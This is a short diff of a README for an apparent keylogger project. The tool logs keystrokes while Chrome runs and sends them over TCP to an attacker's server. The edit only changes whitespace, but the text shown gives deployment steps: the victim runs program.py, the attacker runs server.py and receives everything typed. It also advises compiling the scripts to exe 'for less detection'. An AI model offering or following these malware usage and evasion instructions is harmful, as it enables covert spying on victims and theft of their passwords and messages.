@@ -6,9 +6,9 @@ A keylogger that starts logging when chrome is running. This malware will send t
 First of all, you can edit the code a bit and compile all the scripts into exe for less detection.
 
 Follow these steps:
-  1- The victim must run program.py, when the file is ran, the keylogger and the TCP Client will start too.\n
-  2- The attacker must run server.py then bind his/her IP and port.\n
-  3- You will start receiving everything the victim types.\n
+  1- The victim must run program.py, when the file is ran, the keylogger and the TCP Client will start too. \n
+  2- The attacker must run server.py then bind his/her IP and port. \n
+  3- You will start receiving everything the victim types. \n
 
 # Deeper demonstration:
 Attacker:\n
